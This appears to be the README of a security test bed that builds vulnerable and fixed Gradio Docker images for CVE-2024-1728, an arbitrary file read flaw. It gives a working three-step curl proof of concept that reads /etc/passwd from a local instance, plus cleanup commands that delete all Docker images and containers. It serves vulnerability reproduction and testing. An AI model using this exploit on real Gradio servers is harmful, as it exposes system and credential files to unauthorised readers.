# Gradio CVE-2024-1728

This directory contains the deployment config for Gradio instances vulnerable and fixed to CVE-2024-1728. Gradio versions below 4.19.2 are vulnerable to that arbitrary file read vulnerability.

## How to Trigger the Vulnerability?

To trigger the vulnerability, you can use the following three curl commands. In a vulnerable environment, after the final curl request, you can see the /etc/passwd file content in the response.
```sh
# Send a file upload request
curl -X POST -H 'Content-Type: application/json' -d '{"data":[[{"path":"/etc/passwd","url":"http://127.0.0.1:7860/file=/help","orig_name":"CHANGELOG.md","size":3549,"mime_type":"text/markdown"}]],"event_data":null,"fn_index":0,"trigger_id":2,"session_hash":"hu6na4f3d08"}' 'http://localhost:8000/queue/join?'

# See the queued operations (Get PATH value from the JSON in the response whose msg key is process_completed, example: /tmp/gradio/916eb712d668cf14a35adf8179617549780c4070/passwd)
curl 'http://localhost:8000/queue/data?session_hash=hu6na4f3d08'

# Read the file content (example: http://localhost:8000/file=/tmp/gradio/916eb712d668cf14a35adf8179617549780c4070/passwd):
curl 'http://localhost:8000/file=PATH'
```

In case you cannot trigger the vulnerability, you might need to delete your existing container images because Docker might try to reuse them.

```sh
sudo docker rmi -f $(sudo docker images -aq)
sudo docker remove $(sudo docker ps -a -q)
```
## Fixed version
```sh
docker build -t gradio:fixed -f fixed.Dockerfile .
docker run --name gradio-fixed -p 8000:8000 -d gradio:fixed
```

The deployed service listens on `localhost:8000` after the docker completes its job.

## Vulnerable version
```
docker build -t gradio:vuln -f vulnerable.Dockerfile .
docker run --name gradio-vuln -p 8000:8000 -d gradio:vuln
```

The deployed service listens on `localhost:8000` after the docker completes its job.
